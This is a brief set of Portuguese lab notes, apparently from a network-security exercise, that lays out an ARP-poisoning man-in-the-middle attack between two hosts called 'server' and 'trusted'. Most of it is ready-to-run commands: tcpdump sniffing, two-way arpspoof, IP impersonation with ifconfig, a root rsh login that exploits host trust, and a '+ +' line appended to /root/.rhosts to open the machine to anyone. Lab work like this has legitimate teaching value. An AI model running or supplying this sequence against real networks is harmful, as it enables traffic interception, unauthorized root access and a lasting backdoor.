atacker: para obter enderecos do server e trusted, vamos usar tcpdump pra monitorar o trafego entre server e trusted
tcpdump -x -i eth0 arp


como as entradas da cache arp expiram após alguns minutos, realizar uma comunicação via ip eventualmente irá resultar em um arp request
e como estamos monitorando a rede poderemos saber o ip de quem fez o request, seu mac e o ip de quem ele quer saber o mac

trusted: pingar server pra causar um arp request
ping server

server: pingar trusted para causar um arp request
ping trusted


da pra simular o cache expiry com arp -d [ip]

attacker: agora que sabemos os macs e ips de quem está na nossa rede, vamos adicioná-los a nossa propria cache
arp -s [ip de trusted] [mac de trusted]
arp -s [ip de server] [mac de server]

attacker: agora somos capazes de evenenar as tabelas de cada uma dessas máquinas para implementarmos o ataque man-in-the-middle
para isso vamos envenenar os dois lados da conexao
arpspoof -i eth0 -t trusted server > /dev/null 2>&1 &
arpspoof -i eth0 -t server trusted > /dev/null 2>&1 &

com isso toda a comunicação que deveria ocorrer entre server e trusted passará também por attacker


attacker: agora começamos a monitorar os pacotes que passam de um lado para o outro, dessa vez vamos analisar os pacotes como ascii para
ver se alguma informação interessante trafega

tcpdump -X -i eth0 host [ip de trusted]

attacker: com isso notamos que há comunicação rsh ocorrendo entre as duas maquinas, logo é possível que haja uma relação de confiança entre as duas
analisando os dados que passam, identificamos que root@server confia em trusted
então iremos nos personificar como uma das máquinas confiáveis e invadir o sistema alheio!

# dos em trusted???????????

attacker: vamos spoofar nosso ip para trusted
ifconfig eth0 [ip de trusted]

attacker: agora somos vistos como trusted, então vamo invadir server
rsh root@server

attacker: agora que estamos dentro (e com privilegios), vamos escancarar a máquina pra qualquer um que deseje entrar rsrsrs
echo + + >> /root/.rhosts

attacker: com o acesso liberado, vamo sair da máquina
exit


# arp entry max age
/proc/sys/net/ipv4/neigh/ethX/gc_stale_time